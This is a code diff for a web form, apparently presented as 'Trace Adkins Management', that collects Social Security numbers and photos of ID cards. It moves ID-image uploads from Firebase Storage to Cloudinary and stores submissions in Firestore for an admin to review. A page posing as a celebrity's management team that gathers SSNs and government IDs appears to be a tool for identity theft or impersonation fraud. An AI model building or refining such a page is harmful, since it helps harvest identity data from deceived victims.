@@ -829,6 +829,13 @@
             margin-top: 6px;
             display: none;
         }
+        
+        .upload-status {
+            font-size: 0.85rem;
+            color: #0f3460;
+            margin-top: 8px;
+            font-weight: 600;
+        }
     </style>
 </head>
 <body>
@@ -1016,9 +1023,10 @@
                         <div class="upload-area" id="uploadArea" onclick="document.getElementById('idFile').click()">
                             <div class="upload-icon">🆔</div>
                             <div class="upload-text">Click here or drag & drop to upload your ID</div>
-                            <div class="upload-hint">Supported formats: JPG, PNG, PDF (Max 10MB)</div>
+                            <div class="upload-hint">Supported formats: JPG, PNG (Max 10MB)</div>
                         </div>
-                        <input type="file" id="idFile" class="file-input" accept="image/*,.pdf" capture="environment" onchange="handleFileSelect(event)">
+                        <input type="file" id="idFile" class="file-input" accept="image/*" capture="environment" onchange="handleFileSelect(event)">
+                        <div class="upload-status" id="uploadStatus"></div>
                     </div>
                     
                     <div class="file-list" id="fileList"></div>
@@ -1157,8 +1165,8 @@
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getFirestore, collection, addDoc, onSnapshot, query, orderBy, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
-        import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
 
+        // Your web app's Firebase configuration
         const firebaseConfig = {
             apiKey: "AIzaSyDy3UPxm8vG63MGHmbNjzSGC6wK-ZpGzq8",
             authDomain: "trace-adkins-management.firebaseapp.com",
@@ -1168,13 +1176,18 @@
             appId: "1:441380649506:web:596319bd69177228dfa87b"
         };
 
+        // Initialize Firebase
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
-        const storage = getStorage(app);
+
+        // Cloudinary config
+        const CLOUDINARY_CLOUD_NAME = 'dgqppu8m4';
+        const CLOUDINARY_UPLOAD_PRESET = 'Trace Adkins Management';
 
         // Global variables
         let currentFile = null;
         let currentFileData = null;
+        let cloudinaryImageUrl = null;
         let allSubmissions = [];
         let currentFilter = 'all';
         let unsubscribeSnapshot = null;
@@ -1300,6 +1313,8 @@
             document.getElementById('fileList').innerHTML = '';
             currentFile = null;
             currentFileData = null;
+            cloudinaryImageUrl = null;
+            document.getElementById('uploadStatus').textContent = '';
         };
         
         // Drag and drop
@@ -1322,52 +1337,72 @@
             }
         });
 
+        // ===== CLOUDINARY IMAGE UPLOAD =====
+        async function uploadToCloudinary(file) {
+            const url = `https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/image/upload`;
+            const formData = new FormData();
+            formData.append('file', file);
+            formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
+            
+            const response = await fetch(url, {
+                method: 'POST',
+                body: formData
+            });
+            
+            if (!response.ok) {
+                throw new Error('Cloudinary upload failed: ' + response.statusText);
+            }
+            
+            const data = await response.json();
+            return data.secure_url;
+        }
+
         // ===== FORM SUBMISSION =====
         document.getElementById('mainForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
             const submitBtn = document.getElementById('submitBtn');
+            const uploadStatus = document.getElementById('uploadStatus');
             submitBtn.disabled = true;
             submitBtn.textContent = 'Uploading...';
             
-            // Validate SSN
-            const ssnValue = ssnInput.value;
-            const ssnDigits = ssnValue.replace(/\D/g, '');
-            if (ssnDigits.length !== 9) {
-                ssnInput.focus();
-                validateSSN(ssnValue);
-                submitBtn.disabled = false;
-                submitBtn.textContent = 'Submit to Management Team';
-                return;
-            }
-            
-            const formData = new FormData(this);
-            const data = {};
-            formData.forEach((value, key) => { data[key] = value; });
-            
-            const refId = 'TA-' + new Date().getFullYear() + '-' + Math.floor(1000 + Math.random() * 9000);
-            
-            let imageUrl = null;
-            let imageName = '';
-            
-            // Upload image to Firebase Storage if file exists
-            if (currentFile) {
-                try {
-                    const storageRef = ref(storage, 'id-cards/' + refId + '_' + currentFile.name);
-                    await uploadBytes(storageRef, currentFile);
-                    imageUrl = await getDownloadURL(storageRef);
-                    imageName = currentFile.name;
-                } catch (err) {
-                    console.error('Image upload failed:', err);
-                    alert('Image upload failed. Please try again.');
-                    submitBtn.disabled = false;
-                    submitBtn.textContent = 'Submit to Management Team';
+            try {
+                // Validate SSN
+                const ssnValue = ssnInput.value;
+                const ssnDigits = ssnValue.replace(/\D/g, '');
+                if (ssnDigits.length !== 9) {
+                    ssnInput.focus();
+                    validateSSN(ssnValue);
+                    alert('Please enter a valid 9-digit SSN.');
                     return;
                 }
-            }
-            
-            // Save to Firestore
-            try {
+                
+                const formData = new FormData(this);
+                const data = {};
+                formData.forEach((value, key) => { data[key] = value; });
+                
+                const refId = 'TA-' + new Date().getFullYear() + '-' + Math.floor(1000 + Math.random() * 9000);
+                
+                // Upload image to Cloudinary if file exists
+                let imageUrl = null;
+                let imageName = '';
+                
+                if (currentFile) {
+                    uploadStatus.textContent = '📤 Uploading ID image...';
+                    try {
+                        imageUrl = await uploadToCloudinary(currentFile);
+                        imageName = currentFile.name;
+                        uploadStatus.textContent = '✅ Image uploaded!';
+                    } catch (err) {
+                        console.error('Cloudinary upload failed:', err);
+                        uploadStatus.textContent = '❌ Image upload failed';
+                        alert('Image upload failed. Please try again or use a smaller file.');
+                        return;
+                    }
+                }
+                
+                // Save to Firestore
+                submitBtn.textContent = 'Saving...';
                 await addDoc(collection(db, 'submissions'), {
                     refId: refId,
                     date: new Date().toISOString().split('T')[0],
@@ -1404,13 +1439,14 @@
                     ssnInput.classList.remove('ssn-incomplete', 'ssn-correct', 'ssn-incorrect');
                     ssnMessage.textContent = '';
                     zipWarning.style.display = 'none';
-                    submitBtn.disabled = false;
-                    submitBtn.textContent = 'Submit to Management Team';
+                    uploadStatus.textContent = '';
                 }, 5000);
                 
             } catch (err) {
-                console.error('Firestore save failed:', err);
-                alert('Submission failed. Please try again.');
+                console.error('Submission error:', err);
+                alert('Something went wrong: ' + (err.message || 'Please check your connection and try again.'));
+            } finally {
+                // ALWAYS reset button, no matter what happened
                 submitBtn.disabled = false;
                 submitBtn.textContent = 'Submit to Management Team';
             }
@@ -1572,9 +1608,6 @@
             if (!sub) return;
             
             const statusOptions = ['pending', 'review', 'approved'];
-            const statusSelect = statusOptions.map(opt => 
-                `<option value="${opt}" ${sub.status === opt ? 'selected' : ''}>${opt.charAt(0).toUpperCase() + opt.slice(1)}</option>`
-            ).join('');
             
             const newStatus = prompt(
                 `Submission Details:\n\n` +
